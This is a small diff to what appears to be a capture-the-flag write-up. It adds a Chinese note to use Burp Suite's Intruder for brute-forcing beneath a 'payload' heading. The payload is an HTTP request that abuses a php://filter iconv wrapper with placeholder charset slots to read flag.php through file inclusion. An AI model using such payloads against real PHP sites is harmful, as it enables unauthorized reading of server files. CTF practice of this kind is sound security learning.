@@ -136,6 +136,7 @@ ArmSCII-8
 ```
 
 ## payload
+brupsuit 抓包 ctrl+i 爆破
 ```http request
 GET /?filename=php://filter/convert.iconv.§§.§§/resource=flag.php / HTTP/1.1
 Host: 61.147.171.105:56702
